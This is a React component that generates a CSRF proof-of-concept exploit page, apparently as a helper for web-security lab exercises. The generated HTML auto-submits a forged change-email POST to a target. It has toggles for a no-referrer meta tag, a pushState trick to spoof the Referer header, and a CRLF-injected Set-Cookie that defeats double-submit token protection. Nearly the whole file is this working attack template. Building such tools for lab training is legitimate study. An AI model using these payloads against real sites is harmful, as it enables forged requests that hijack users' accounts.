import { useState } from 'react';
import DefaultCodeBlock from './CodeBlock.jsx';

/*
 * CSRF proof-of-concept exploit page with toggles for (a) the hidden CSRF-token
 * field, (b) a no-referrer meta tag, (c) a pushState Referer trick, and (d) a
 * Set-Cookie (double-submit) via CRLF injection. The {{csrf}} input is always
 * shown (via extraTokens) so you can fill it regardless of the field toggle.
 * The form auto-submits on load.
 *
 * Host seams (props): CodeBlock lets a host inject its own (globally
 * token-aware) block — defaults to this package's self-contained CodeBlock.
 * openModal / onBurst are forwarded to that CodeBlock.
 */
export default function CsrfPoc({ CodeBlock = DefaultCodeBlock, openModal, onBurst }) {
  const [withToken, setWithToken] = useState(false);
  const [withReferrer, setWithReferrer] = useState(false);
  const [withPushState, setWithPushState] = useState(false);
  const [withCookieSet, setWithCookieSet] = useState(false);

  const metaLine = withReferrer
    ? '    <meta name="referrer" content="no-referrer">\n'
    : '';
  const pushBlock = withPushState
    ? '    <script>\n' +
      '        // Rewrite the URL bar so the Referer header includes the target lab domain\n' +
      '        history.pushState("", "", "/?{{target}}");\n' +
      '    </script>\n'
    : '';
  const tokenLine = withToken
    ? '\n      <input type="hidden" name="csrf" value="{{csrf}}" />'
    : '';
  // Default: a script auto-submits the form on load. With "Set Cookie" on, an
  // <img> CRLF-injects a Set-Cookie (csrf=<token>; SameSite=None) into the
  // target's response, then submits the form once the image errors — so the
  // forged cookie and the form body carry the same token (double-submit bypass).
  const submitLine = withCookieSet
    ? '    <img src="https://{{target}}/?search=test%0d%0aSet-Cookie:%20csrf={{csrf}}%3b%20SameSite=None" onerror="document.forms[0].submit();"/>\n'
    : "    <script>document.getElementById('csrfForm').submit();</script>\n";
  const code =
    '<html>\n' +
    '  <body>\n' +
    metaLine +
    pushBlock +
    '    <form id="csrfForm" action="https://{{target}}/my-account/change-email" method="POST">\n' +
    '      <input type="hidden" name="email" value="{{email}}" />' + tokenLine + '\n' +
    '    </form>\n' +
    submitLine +
    '  </body>\n' +
    '</html>';

  return (
    <div>
      <label className="toggle-line">
        <input
          type="checkbox"
          checked={withToken}
          onChange={(e) => setWithToken(e.target.checked)}
        />
        Include CSRF token hidden field
      </label>
      <label className="toggle-line">
        <input
          type="checkbox"
          checked={withReferrer}
          onChange={(e) => setWithReferrer(e.target.checked)}
        />
        Include no-referrer meta tag
      </label>
      <label className="toggle-line">
        <input
          type="checkbox"
          checked={withPushState}
          onChange={(e) => setWithPushState(e.target.checked)}
        />
        run pushState so Referer includes lab domain
      </label>
      <label className="toggle-line">
        <input
          type="checkbox"
          checked={withCookieSet}
          onChange={(e) => setWithCookieSet(e.target.checked)}
        />
        Set Cookie with CSRF value
      </label>
      {withPushState && (
        <div className="callout danger">
          <strong>Referrer-Policy: </strong>
          add <code className="inline">Referrer-Policy: unsafe-url</code> to the <strong>Head</strong>{' '}
          section of the exploit server, or the browser strips the path and the lab domain never
          reaches the Referer.
        </div>
      )}
      <CodeBlock
        label="exploit.html"
        code={code}
        extraTokens={['csrf']}
        openModal={openModal}
        onBurst={onBurst}
      />
    </div>
  );
}
